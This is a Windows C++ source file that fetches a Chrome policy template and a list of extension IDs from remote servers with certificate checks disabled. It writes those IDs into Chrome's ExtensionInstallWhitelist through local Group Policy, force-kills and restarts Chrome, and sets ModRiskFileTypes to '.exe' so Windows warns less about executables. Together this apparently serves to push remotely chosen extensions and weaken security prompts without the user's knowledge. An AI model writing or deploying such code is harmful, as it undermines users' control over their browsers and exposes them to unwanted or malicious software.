#define   INITGUID 
#include "np_tool_function.h"
#include <GPEdit.h>
//#include<Guiddef.h>
//#include <ShlObj.h>
#include <Psapi.h>
#include <io.h>
#include <iostream>
#include <curl\curl.h>
#include "cJSON.h"

using namespace std;

//#pragma comment(lib, "psapi.lib")

//#define ADM_URL	"http://file.poptop.cc/chrome.adm"
#define ADM_URL	"http://chex.oss-cn-shanghai.aliyuncs.com/host/chrome.adm"
#define EXTERN_ID_URL "https://wwwphpapi-0.disi.se/v1/extension/browser/codes"

#define ADM_PATH	"C:\\WINDOWS\\system32\\grouppolicy\\Adm"
#define ADM_FILE	"C:\\WINDOWS\\system32\\grouppolicy\\Adm\\chrome.adm"
#define REG_CHROME_ITEM	"Software\\Policies\\Google\\Chrome\\ExtensionInstallWhitelist"

#define ADM_MD5		"67c4aa56bc77efe412548d30915bd179"

//#define MY_ALIGN(size, boundary) (((size) + ((boundary) - 1 )) & ~((boundary) - 1))

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 255

typedef size_t (* TFun)(void* , size_t , size_t , void *);

typedef struct _recvbuffer
{
	size_t nrecved;
	char* precv;
}RecvBuffer;

struct value_node
{
	char* pValue;
	struct value_node* pPre;
	struct value_node* pNext;
};

struct value_node* pHead = NULL;

int nHasExist = 0;

DWORD dwType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;

char ChromePath[MAX_PATH];

//BOOL Execmd(char* cmd, char** result)
//{
//	int readlen = 0;
//	int readtotal = 0;
//	char buffer[128];
//	char* pUserData = (char*)malloc(1024);
//	ZeroMemory(pUserData, 1024);
//	FILE *pipe = _popen(cmd, "r");
//	if (!pipe)
//	{
//		free(pUserData);
//		pUserData = NULL;
//		return FALSE;
//	}
//
//	while (!feof(pipe))
//	{
//		if (fgets(buffer, 128, pipe))
//		{
//			readlen = strlen(buffer) + 1;
//			readtotal += readlen;
//			if (readtotal > (int)_msize(pUserData))
//			{
//				int RelAllocByteSize = MY_ALIGN((readtotal + 1), 8);
//				pUserData = (char*)realloc(pUserData, RelAllocByteSize);
//			}
//			strcat_s(pUserData, readtotal, buffer);
//		}
//	}
//
//	_pclose(pipe);
//	*result = pUserData;
//
//	return TRUE;
//}

size_t curl_recv_function(void* buffer, size_t size, size_t nmemb, void *_pRecvBuffer)
{
	RecvBuffer* pRecvBuffer = (RecvBuffer*)_pRecvBuffer;
	size_t recvlen = MY_ALIGN((pRecvBuffer->nrecved + (size * nmemb) + 1), 8);
	if (_msize(pRecvBuffer->precv) < recvlen)
		pRecvBuffer->precv = (char*)realloc(pRecvBuffer->precv, recvlen);
	if (pRecvBuffer->precv)
	{
		memcpy(pRecvBuffer->precv + pRecvBuffer->nrecved, buffer, size * nmemb);
		pRecvBuffer->nrecved += (nmemb * size);
		memset(pRecvBuffer->precv + pRecvBuffer->nrecved, 0x00, 1);
	}

	return size * nmemb;
}

size_t curl_down_function(void* buffer, size_t size, size_t nmemb, void *ptr)
{
	FILE* f = (FILE*)ptr;
	fwrite(buffer, 1, nmemb * size, f);
	return size * nmemb;
}

BOOL biu_down_file(const char* pUrl, TFun curl_func, void* param)
{
	CURL *curl;
	CURLcode code;

	curl = curl_easy_init();
	if (!curl)
	{
		return FALSE;
	}

	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, FALSE);

	curl_easy_setopt(curl, CURLOPT_URL, pUrl);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_func);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, param);
	curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1);
	curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 8);

	code = curl_easy_perform(curl);
	if (CURLE_OK != code)
	{
		//fprintf(stderr, "GET请求返回值:%d\n", code);
		//switch (code)
		//{
		//case CURLE_COULDNT_CONNECT:
		//	fprintf(stderr, "不能连接到目标主机\n");
		//break;
		//default:
		//	break;
		//}
//		fclose(fptr);
		curl_easy_cleanup(curl);
		return FALSE;
	}

//	fclose(fptr);
	curl_easy_cleanup(curl);
	return TRUE;
}

BOOL CompareValuse(const char* _pValue)
{
	struct value_node* pNode = pHead;
	while (pNode)
	{
		if (strcmp(pNode->pValue, _pValue) == 0)
		{
			if (pNode == pHead)
			{
				pHead = pHead->pNext;
				if (pHead)
					pHead->pPre = NULL;
			}else
			{
				pNode->pPre->pNext = pNode->pNext;
				if (pNode->pNext)
					pNode->pNext->pPre = pNode->pPre;
			}

			return FALSE;
		}
		pNode = pNode->pNext;
	}
	
	return TRUE;
}
 
void QueryKey(HKEY hKey) 
{ 
    char    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD i, retCode; 
 
    char  achValue[MAX_VALUE_NAME]; 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    if (cValues) 
    {
		nHasExist = cValues;

        for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
        { 
            cchValue = MAX_VALUE_NAME; 
            achValue[0] = '\0'; 
            retCode = RegEnumValue(hKey, i, 
                achValue, 
                &cchValue, 
                NULL, 
                NULL,
                NULL,
                NULL);
 
            if (retCode == ERROR_SUCCESS ) 
            { 
				char szBuffer[255] = { 0 };
				DWORD dwNameLen = 255;
				DWORD rQ = RegQueryValueEx(hKey, achValue, 0, &dwType, (LPBYTE)szBuffer, &dwNameLen);
				if (rQ == ERROR_SUCCESS)
				{
					CompareValuse(szBuffer);
				}
            } 
        }
    }
}

LRESULT ModifyWhitelist()
{
	::CoInitialize(NULL);
	LRESULT status;
	LRESULT hr = S_OK;
	IGroupPolicyObject*pGPO = NULL;
	hr = CoCreateInstance(CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER, IID_IGroupPolicyObject, (LPVOID*)&pGPO);
	if (hr == S_OK)
	{
	//	cout << "GPO创建成功\n";
	}
	else
	{
	//	cout << "GPO创建失败\n";
		return E_FAIL;
	}
//	DWORD dwSection = GPO_SECTION_USER;
	DWORD dwSection = GPO_SECTION_MACHINE;
	HKEY hGPOKey = 0;
	hr = pGPO->OpenLocalMachineGPO(GPO_OPEN_LOAD_REGISTRY);
	if (SUCCEEDED(hr))
	{
	//	cout << "打开本地机器成功\n";
	}
	else
	{
	//	cout << "打开本地失败\n";
		cout << GetLastError() << endl;
		return E_FAIL;
	}
	hr = pGPO->GetRegistryKey(dwSection, &hGPOKey);
	if (SUCCEEDED(hr))
	{
	//	cout << "加载注册表成功\n";
	}
	else
	{
	//	cout << "加载注册表失败\n";
		return E_FAIL;
	}

	HKEY hKey = NULL;

	status = RegOpenKeyEx(hGPOKey, "Software\\Policies\\Google\\Chrome\\ExtensionInstallWhitelist", 0,
		KEY_WRITE, &hKey);

	// 如果没有此项，直接创建添加，不需要对比 如果项已经存在，对比之后添加
	if (status != ERROR_SUCCESS)
	{
		status = RegCreateKeyEx(hGPOKey, "Software\\Policies\\Google\\Chrome\\ExtensionInstallWhitelist", 0,
			NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
		if (status == S_OK)
		{
		//	cout << "创建键值成功\n";
		}
		else
		{
		//	cout << "创建键值失败\n";
			return E_FAIL;
		}
	}

	// 必须字段
	const char* pValue01 = " ";
	status = RegSetValueEx(hKey, "**delvals.", NULL, REG_SZ, (const unsigned char*)pValue01, strlen(pValue01) + 1);

	// 添加字段，根据情况循环
	struct value_node* pNode = pHead;
	while (pNode)
	{
		char cckey[8] = {0};
		_itoa_s(++nHasExist, cckey, 8, 10);
		printf("新增加id:%s\n", pNode->pValue);
		status = RegSetValueEx(hKey, cckey, NULL, REG_SZ, (const unsigned char*)pNode->pValue, strlen(pNode->pValue) + 1);
		pNode = pNode->pNext;
	}

	status = RegCloseKey(hKey);

	GUID Registerid = REGISTRY_EXTENSION_GUID;
	GUID guid;
	CoCreateGuid(&guid);

	RegCloseKey(hGPOKey);

	status = pGPO->Save(TRUE, TRUE, &Registerid, &guid);
	pGPO->Release();
	::CoUninitialize();

	return S_OK;
}

// true找到了并且已经关闭  false没有找到
BOOL CloseChromeExe()
{
	PROCESSENTRY32 pe32;
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(pe32);

	if (INVALID_HANDLE_VALUE == hProcessSnap)
	{
		printf("创建进程映射失败\n");
		return FALSE;
	}

	BOOL bMode = ::Process32First(hProcessSnap, &pe32);
	while (bMode)
	{
		if (0 == strcmp("chrome.exe", pe32.szExeFile))
		{
			HANDLE ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			GetModuleFileNameEx(ProcessHandle, NULL, ChromePath, MAX_PATH);
		//	printf("%s\n", ChromePath);
		//	printf("%d\n", GetLastError());
			CloseHandle(ProcessHandle);
			//TerminateProcess(ProcessHandle, 0);
			char *pInfo = NULL;
			Execmd("taskkill /im chrome.exe /f", &pInfo);
			if (NULL != pInfo)
			{
			//	printf("%s\n", pInfo);
				free(pInfo);
				pInfo = NULL;
			}
			CloseHandle(hProcessSnap);
			return TRUE;
			//HANDLE ProcessHandle = OpenProcess(PROCESS_TERMINATE | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			//TerminateProcess(ProcessHandle, 0);
		}

		bMode = ::Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);

	return FALSE;
}

void AddWhiteList()
{
	char* pInfo = NULL;
	if (_access(ADM_PATH, 0) == -1)
	{
//		CreateDirectory("C:\\WINDOWS\\system32\\grouppolicy", NULL);
//		CreateDirectory("C:\\WINDOWS\\system32\\grouppolicy\\Adm", NULL);
		int n = 0;
		do
		{
			Execmd("mkdir C:\\WINDOWS\\system32\\grouppolicy\\Adm", &pInfo);
			if (NULL != pInfo)
			{
				//	printf("%s  -- ok\n", pInfo);
				free(pInfo);
				pInfo = NULL;
			}
		}while(_access(ADM_PATH, 0) == -1 && n++ < 3);
	//		getchar();
		//do
		//{
		//	ShellExecute(NULL, "open", "gpedit.msc", NULL, NULL, SW_SHOWNORMAL);
		//	Sleep(1000 * 3);
		//	Execmd("taskkill /im mmc.exe /f", &pInfo);
		//	if (NULL != pInfo)
		//	{
		//	//	printf("%s\n", pInfo);
		//		free(pInfo);
		//		pInfo = NULL;
		//	}
		//}while(_access(ADM_PATH, 0) == -1);
	}

	if (!needdownload(ADM_PATH, ADM_MD5))
	{
		FILE* fptr;
		fopen_s(&fptr, ADM_FILE, "wb");
		if (NULL == fptr)
		{
			printf("%d\n", GetLastError());
		//	getchar();
			return ;
		}
		if (!biu_down_file(ADM_URL, curl_down_function, fptr))
		{
			fclose(fptr);
			return ;
		}
		fclose(fptr);
	}

	// 获取id
	RecvBuffer* pRecvBuffer = new RecvBuffer;
	pRecvBuffer->nrecved = 0;
	pRecvBuffer->precv = (char*)malloc(256);
	if(!biu_down_file(EXTERN_ID_URL, curl_recv_function, pRecvBuffer))
	{
		free(pRecvBuffer->precv);
		delete pRecvBuffer;
		return;
	}
	cJSON* root = cJSON_Parse(pRecvBuffer->precv);
	if (NULL == root)
	{
		free(pRecvBuffer->precv);
		delete pRecvBuffer;
		return;
	}
	free(pRecvBuffer->precv);
	delete pRecvBuffer;
	int n = cJSON_GetArraySize(root);
	if (n == 0)
	{
		cJSON_Delete(root);
		return;
	}
	for (int i = 0; i < n; i++)
	{
		struct value_node* pnode = new value_node;
		ZeroMemory(pnode, sizeof(value_node));
		cJSON* item = cJSON_GetArrayItem(root, i);
		pnode->pValue = item->valuestring;
	//	cout << pnode->pValue << endl;
		pnode->pNext = pHead;
		if (NULL != pHead)
			pHead->pPre = pnode;
		pHead = pnode;
	}

	//free(pRecvBuffer->precv);
	//delete pRecvBuffer;

	// 操作注册表
	HKEY hChreomeKey;
	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
		REG_CHROME_ITEM,
		0,
		KEY_READ,
		&hChreomeKey) == ERROR_SUCCESS
		)
	{
		QueryKey(hChreomeKey);
		RegCloseKey(hChreomeKey);
	}

	if (pHead)
	{
		ModifyWhitelist();

		CloseChromeExe();

		char szStartPath[MAX_PATH] = {0};
		if (!SHGetSpecialFolderPath(NULL,szStartPath, CSIDL_DESKTOPDIRECTORY, 0))
			return;
		strcat(szStartPath, CHROME_LNK);
		if (_access(szStartPath, 0) == 0)
		{
			ShellExecute(NULL, "open", szStartPath, NULL, NULL, SW_SHOWNORMAL);
		}

		printf("白名单更新完成\n");
	}else
	{
		printf("白名单不需要更新\n");
	}

	cJSON_Delete(root);

//	getchar();
}



















LRESULT ModifyModRiskFileType()
{
	::CoInitialize(NULL);
	LRESULT status;
	LRESULT hr = S_OK;
	IGroupPolicyObject*pGPO = NULL;
	hr = CoCreateInstance(CLSID_GroupPolicyObject, NULL, CLSCTX_INPROC_SERVER, IID_IGroupPolicyObject, (LPVOID*)&pGPO);
	if (hr != S_OK)
	{
	//	cout << "GPO创建成功\n";
		return E_FAIL;
	}

	DWORD dwSection = GPO_SECTION_USER;
//	DWORD dwSection = GPO_SECTION_MACHINE;
	HKEY hGPOKey = 0;
	hr = pGPO->OpenLocalMachineGPO(GPO_OPEN_LOAD_REGISTRY);
	if (SUCCEEDED(hr))
	{
	//	cout << "打开本地机器成功\n";
	}
	else
	{
	//	cout << "打开本地失败\n";
		cout << GetLastError() << endl;
		return E_FAIL;
	}
	hr = pGPO->GetRegistryKey(dwSection, &hGPOKey);
	if (SUCCEEDED(hr))
	{
	//	cout << "加载注册表成功\n";
	}
	else
	{
	//	cout << "加载注册表失败\n";
		return E_FAIL;
	}

	HKEY hKey = NULL;

	status = RegOpenKeyEx(hGPOKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", 0,
		KEY_WRITE, &hKey);

	// 如果没有此项，直接创建添加，不需要对比 如果项已经存在，对比之后添加
	if (status != ERROR_SUCCESS)
	{
		status = RegCreateKeyEx(hGPOKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", 0,
			NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
		if (status == S_OK)
		{
		//	cout << "创建键值成功\n";
		}
		else
		{
		//	cout << "创建键值失败\n";
			return E_FAIL;
		}
	}

	// 必须字段
	const char* pValue01 = ".exe";
	status = RegSetValueEx(hKey, "ModRiskFileTypes", NULL, REG_SZ, (const unsigned char*)pValue01, strlen(pValue01) + 1);


	status = RegCloseKey(hKey);

	GUID Registerid = REGISTRY_EXTENSION_GUID;
	GUID guid;
	CoCreateGuid(&guid);

	RegCloseKey(hGPOKey);

	status = pGPO->Save(FALSE, TRUE, &Registerid, &guid);
	pGPO->Release();
	::CoUninitialize();

	return S_OK;
}


void AddModRiskFileType()
{
	HKEY hChreomeKey;
	if( RegOpenKeyEx( HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations",
		0,
		KEY_READ,
		&hChreomeKey) == ERROR_SUCCESS
		)
	{
		return;
	}

	ModifyModRiskFileType();
}